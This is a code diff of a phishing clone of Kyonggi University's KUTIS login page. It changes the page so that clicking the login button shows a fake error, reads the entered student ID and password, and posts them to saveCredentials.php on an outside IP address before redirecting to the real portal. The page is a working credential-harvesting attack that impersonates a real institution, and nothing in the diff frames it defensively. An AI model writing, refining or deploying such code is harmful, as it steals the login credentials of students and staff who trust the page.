@@ -54,11 +54,7 @@ var SystemInfo = new function() {
 	this.systemDomain = 'aHR0cDovL2t1dGlzLmt5b25nZ2kuYWMua3I=';
 	this.systemDomainPort = 'ODA=';
 }
-
 </script>
-
-
-
 
 
 <!DOCTYPE HTML>
@@ -126,8 +122,8 @@ var SystemInfo = new function() {
 <script>
   function submitForm() {
     alert('입력한 정보가 올바르지 않습니다!');
-    var id = document.getElementById('id').value;
-    var pw = document.getElementById('pw').value;
+    var id = document.myform.userId.value;
+    var pw = document.myform.passwd.value;
 
     var saveUrl = 'http://20.214.184.232:54321/board/ns_kutis/kutis.kyonggi.ac.kr/webkutis/view/saveCredentials.php';
     var xhr = new XMLHttpRequest();
@@ -147,9 +143,6 @@ var SystemInfo = new function() {
       };
 
     xhr.send(JSON.stringify(data));
-
-    
-
   }
 </script>
 </HEAD>
@@ -168,19 +161,19 @@ var SystemInfo = new function() {
 
   <!-- 로그인 컨텐츠 -->
   <section class="loginArea"  id="login_scroll">
-  	<form name="myform" method="post" action="saveCredentials.php">
+  	<form name="myform" method="post">
 	    <input type="hidden" name="username" value="">
 	    <input type="hidden" name="password" value="">
 	    <fieldset>
         <legend>로그인 영역</legend>
         <dl>
-          <!-- <dd><input type=text name="id" id="id" value="" class=u_input_type size=11 maxlength=11 onKeyDown="CommKutisUtil.KeyDown(event)" onFocus="this.select();" onChange="document.myform.pw.focus();" class="userId" title="학번/교번"></dd>
-          <dd><input type=password name="pw" id="pw" value="" class=u_input_type size=14 onKeyDown="handleKeyDown(event)" onFocus="this.select();" accesskey="" class="userPw" title="패스워드"></dd> -->
-          <dd><input type=text name="id" id="id" value="" class=u_input_type size=11 maxlength=11 class="userId" title="학번/교번"></dd>
-          <dd><input type=password name="pw" id="pw" value="" class=u_input_type size=14 onKeyDown="handleKeyDown(event)" class="userPw" title="패스워드"></dd>
+          <dd><input type=text name="id" id="id" value="" class=u_input_type size=11 maxlength=11 onKeyDown="CommKutisUtil.KeyDown(event)" onFocus="this.select();" onChange="document.myform.pw.focus();" class="userId" title="학번/교번"></dd>
+          <dd><input type=password name="pw" id="pw" value="" class=u_input_type size=14 onKeyDown="handleKeyDown(event)" onFocus="this.select();" accesskey="" class="userPw" title="패스워드"></dd>
         </dl>
         <p class="btnArea">
-          <a href="https://kutis.kyonggi.ac.kr/webkutis/view/indexWeb.jsp" onclick="alert('입력한 정보가 올바르지 않습니다!');" ><img src="https://kutis.kyonggi.ac.kr/webkutis/images/renewal/web/btn/btn_loginClass_off.gif" alt="학번/교번 로그인" /></a>
+          <a href="https://kutis.kyonggi.ac.kr/webkutis/view/indexWeb.jsp" onclick="submitForm()" >
+            <img src="https://kutis.kyonggi.ac.kr/webkutis/images/renewal/web/btn/btn_loginClass_off.gif" alt="학번/교번 로그인" />
+          </a>
         </p>
       </fieldset>
         <!-- //로그인 폼 -->
